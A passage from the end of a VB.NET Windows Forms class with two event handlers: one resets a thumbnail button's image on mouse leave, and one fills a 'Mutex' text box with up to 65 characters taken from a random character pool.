    End Sub

    Private Sub Button_Thumbnail_MouseLeave(sender As Object, e As EventArgs) Handles Button_Thumbnail.MouseLeave
        If Not Me.btnthumbnailclicked Then
            Me.Button_Thumbnail.Image = My.Resources.Normal
        End If
    End Sub

    Private Sub RandomPool1_CharacterSelection(s As Object, c As Char) Handles RandomPool1.CharacterSelection
        Try
            If (Me.TB_Mutex.Text.Length <> 65) Then
                Dim box As TextBox = Me.TB_Mutex
                box.Text = (box.Text & c.ToString)
            End If
        Catch ex As Exception

        End Try
    End Sub
End Class
